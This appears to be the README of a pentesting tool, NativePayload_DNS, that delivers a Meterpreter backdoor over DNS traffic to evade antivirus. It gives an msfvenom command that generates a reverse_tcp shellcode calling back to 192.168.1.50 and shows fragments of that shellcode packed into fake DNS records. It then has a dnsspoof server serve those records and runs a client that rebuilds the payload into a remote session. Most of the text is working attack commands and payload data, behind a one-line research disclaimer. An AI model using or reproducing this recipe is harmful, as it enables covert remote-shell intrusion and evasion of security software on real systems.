# NativePayload_DNS
C# code for Backdoor Payloads Transition by DNS Traffic and Bypassing Anti-viruses

Published by Damon Mohammadbagher

Warning: this code Published to explaining Anti-Viruses Vulnerability for Pentesters and Security Researchers

for more information and step by step please Visit these links:

link:

link:
 
 
 step 1:
 
 msfvenom C type payload in your kali linux
 
 msfvenom –-platform windows –arch x86_64 –p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 –f c > /root/Desktop/payload.txt
 
copy payloads from payload.txt file to dns.txt like this format:

root@kali:~# cat /root/Desktop/dns.txt

1.1.1.0 "0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com"

1.1.1.1 "0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com"

1.1.1.2 "0x8b0x520x200x480x8b0x720x500x480x0f0xb70x4a0x4a0x4d0x310xc9.1.com"

1.1.1.3 "0x480x310xc00xac0x3c0x610x7c0x020x2c0x200x410xc10xc90x0d0x41.1.com"

step 2: Make Fake DNS server in your kali linux

root@kali:~# dnsspoof -i eth0 -f /root/Desktop/dns.txt

 step 3:
 
 run code in client
 
 syntax: NativePayload_DNS.exe "1.1.1." 34 "192.168.1.50"
 
 finally you can bypass AVs and you have Meterpreter Session
 
 
 for more information and step by step please Visit these links:
 
 
